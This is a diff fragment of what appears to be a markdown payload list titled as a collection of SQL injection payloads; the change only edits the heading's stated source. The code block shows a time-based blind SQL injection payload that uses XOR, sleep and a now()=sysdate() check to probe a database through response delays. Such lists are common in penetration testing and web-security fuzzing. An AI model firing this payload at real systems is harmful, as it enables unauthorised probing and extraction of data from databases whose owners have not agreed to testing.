@@ -1,4 +1,4 @@
-# Collection of SQLi payloads from Twitter
+# Collection of SQLi payloads from various sources
 
 ```
 -1'XOR(if(now()=sysdate(),sleep(3*2),0))XOR'Z
